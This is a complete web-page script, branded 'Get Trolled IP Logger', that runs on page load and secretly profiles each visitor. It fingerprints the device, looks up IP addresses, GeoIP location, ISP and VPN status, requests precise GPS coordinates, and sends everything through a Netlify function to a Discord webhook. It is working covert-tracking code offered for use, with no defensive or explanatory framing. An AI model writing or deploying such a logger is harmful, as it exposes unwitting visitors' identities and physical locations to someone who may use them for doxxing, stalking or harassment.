<script>
  // Simple hash function
  function hashString(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const chr = str.charCodeAt(i);
      hash = (hash << 5) - hash + chr;
      hash |= 0;
    }
    return Math.abs(hash).toString(16);
  }

  function getDeviceFingerprint() {
    const fingerprintData = [
      navigator.userAgent,
      window.screen.width,
      window.screen.height,
      window.devicePixelRatio,
      window.screen.colorDepth,
      window.innerWidth,
      window.innerHeight,
      navigator.language,
      navigator.platform
    ].join('|');
    return hashString(fingerprintData);
  }

  async function fetchIPInfo() {
    const res = await fetch('https://ipwhois.app/json/');
    if (!res.ok) throw new Error('Failed to fetch IP info');
    return res.json();
  }

  async function fetchIPv6() {
    try {
      const res = await fetch('https://api64.ipify.org?format=json');
      if (!res.ok) return "N/A";
      const json = await res.json();
      if (json.ip && json.ip.includes(':')) return json.ip;
      return "N/A";
    } catch {
      return "N/A";
    }
  }

  function parseUserAgent(ua) {
    let os = "Unknown OS";
    let browser = "Unknown Browser";
    if (/Android/.test(ua)) os = "Android";
    else if (/iPhone/.test(ua)) os = "iOS (iPhone)";
    else if (/iPad/.test(ua)) os = "iOS (iPad)";
    else if (/Windows NT/.test(ua)) os = "Windows";
    else if (/Mac OS X/.test(ua)) os = "Mac OS";
    if (/Chrome\/\d+/.test(ua)) browser = "Chrome";
    else if (/Firefox\/\d+/.test(ua)) browser = "Firefox";
    else if (/Safari\/\d+/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
    else if (/Edg\/\d+/.test(ua)) browser = "Edge";
    return { os, browser };
  }

  function chunkArray(arr, size) {
    const result = [];
    for (let i = 0; i < arr.length; i += size) {
      result.push(arr.slice(i, i + size));
    }
    return result;
  }

  async function sendDiscordWebhook(embeds) {
    const netlifyFunctionUrl = "/.netlify/functions/log-ip";
    const res = await fetch(netlifyFunctionUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds }),
    });
    if (!res.ok) {
      const text = await res.text();
      throw new Error(`Discord webhook error: ${res.status} - ${text}`);
    }
  }

  async function getGPSLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve({ lat: "N/A", lon: "N/A" });
      navigator.geolocation.getCurrentPosition(
        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        () => resolve({ lat: "N/A", lon: "N/A" }),
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });
  }

  (async () => {
    const data = await fetchIPInfo();
    const ipv6 = await fetchIPv6();
    const uaInfo = parseUserAgent(navigator.userAgent);
    const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone });
    const gps = await getGPSLocation();

    const allFields = [
      { name: "Device Fingerprint", value: `\`${getDeviceFingerprint()}\``, inline: false },
      { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
      { name: "IPv6 Address", value: ipv6, inline: true },
      { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
      { name: "Latitude (GeoIP)", value: data.latitude, inline: true },
      { name: "Longitude (GeoIP)", value: data.longitude, inline: true },
      { name: "Latitude (GPS)", value: gps.lat, inline: true },
      { name: "Longitude (GPS)", value: gps.lon, inline: true },
      { name: "ISP", value: data.isp, inline: false },
      { name: "Organization", value: data.org, inline: false },
      { name: "ASN", value: data.asn, inline: true },
      { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
      { name: "Local Time", value: localTime, inline: true },
      { name: "VPN/Proxy", value: data.security?.is_proxy ? "Yes" : "No", inline: true },
      { name: "VPN/Hosting", value: data.security?.is_hosting ? "Yes" : "No", inline: true },
      { name: "Bot", value: data.security?.is_bot ? "Yes" : "No", inline: true },
      { name: "Operating System", value: uaInfo.os, inline: true },
      { name: "Browser", value: uaInfo.browser, inline: true },
      { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
      { name: "Screen Resolution", value: `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)`, inline: true },
    ];

    const chunks = chunkArray(allFields, 25);
    const embeds = chunks.map((fieldsChunk, i) => ({
      title: i === 0 ? "🕵️ New Visitor Logged" : undefined,
      color: 0x00ffff,
      timestamp: new Date().toISOString(),
      footer: i === chunks.length - 1 ? {
        text: "Get Trolled IP Logger",
        icon_url: "https://i.imgur.com/qZ7j0fV.png"
      } : undefined,
      thumbnail: i === 0 ? { url: data.country_flag } : undefined,
      author: i === 0 ? {
        name: "Get Trolled IP Logger",
        url: "https://discord.com",
        icon_url: "https://i.imgur.com/qZ7j0fV.png"
      } : undefined,
      fields: fieldsChunk.map(f => ({
        name: f.name,
        value: f.value.toString(),
        inline: !!f.inline
      }))
    }));

    await sendDiscordWebhook(embeds);
  })();
</script>
